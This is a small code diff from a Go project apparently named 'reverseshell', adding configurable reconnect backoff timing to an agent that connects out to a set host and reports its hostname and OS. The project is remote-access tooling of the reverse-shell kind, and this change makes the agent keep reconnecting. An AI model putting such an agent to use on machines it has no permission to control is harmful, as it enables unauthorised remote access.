@@ -13,6 +13,7 @@ import (
 	"runtime"
 	"strconv"
 	"syscall"
+	"time"
 
 	"reverseshell/internal/agent"
 	"reverseshell/internal/config"
@@ -60,6 +61,8 @@ func main() {
 		Addr:          net.JoinHostPort(cfg.Agent.ConnectHost, strconv.Itoa(cfg.Agent.ConnectPort)),
 		TransportName: cfg.Agent.Transport,
 		MaxFrameBytes: protocol.DefaultMaxFrameBytes,
+		ReconnectBase: time.Duration(cfg.Agent.ReconnectBase * float64(time.Second)),
+		ReconnectCap:  time.Duration(cfg.Agent.ReconnectCap * float64(time.Second)),
 		Info: protocol.AgentInfo{
 			Hostname:      hostname,
 			OS:            runtime.GOOS,
